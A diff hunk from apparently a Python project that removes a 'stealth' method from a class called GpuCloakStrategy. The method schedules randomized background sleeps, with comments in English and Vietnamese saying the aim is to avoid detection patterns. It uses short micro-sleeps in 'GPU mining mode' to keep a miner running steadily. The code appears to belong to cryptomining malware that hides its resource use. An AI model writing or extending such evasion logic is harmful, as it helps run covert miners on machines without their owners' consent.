@@ -1901,45 +1901,6 @@ class GpuCloakStrategy:
             },
             'message': 'Emergency fallback configuration applied'
         }
-    
-    def _apply_random_sleep_interval(self) -> None:
-        """
-        ✅ STEALTH: Apply random sleep interval to avoid detection patterns
-        Ngủ ngẫu nhiên để tránh bị phát hiện qua pattern recognition
-        """
-        try:
-            # Non-blocking: lập lịch ngủ trong thread riêng để không chặn luồng chính
-            def _sleep_task():
-                try:
-                    INTERVAL_CHOICES = [
-                        (300, 600),
-                        (600, 1200),
-                        (1200, 1800),
-                        (1800, 3600),
-                        (3600, 7200),
-                    ]
-                    chosen_range = random.choice(INTERVAL_CHOICES)
-                    # In GPU mining mode, suppress long sleeps and use micro-sleep to keep miner steady
-                    if os.getenv('MINING_MODE', 'gpu').lower() == 'gpu':
-                        micro_sleep = int(os.getenv('STEALTH_MICRO_SLEEP_MS', '50'))
-                        time.sleep(max(0, micro_sleep) / 1000.0)
-                        self.logger.debug(f"[STEALTH] Micro-sleep applied: {micro_sleep}ms (mining mode)")
-                    else:
-                        random_sleep_sec = random.randint(*chosen_range)
-                        self.logger.info(
-                            f"🕐 [STEALTH] Scheduled background sleep {random_sleep_sec}s "
-                            f"({random_sleep_sec//60}m) from range {chosen_range}"
-                        )
-                        time.sleep(random_sleep_sec)
-                        self.logger.debug(f"[STEALTH] Background sleep completed: {random_sleep_sec}s")
-                except Exception as _e:
-                    self.logger.debug(f"[STEALTH] Background sleep error: {_e}")
-
-            t = threading.Thread(target=_sleep_task, name="GpuCloakStrategy-RandomSleep", daemon=True)
-            t.start()
-        except Exception as e:
-            self.logger.warning(f"⚠️ [STEALTH] Random sleep scheduling failed: {e}, continuing without delay")
-
 
 def _register_strategy_recovery_handlers() -> None:
     """
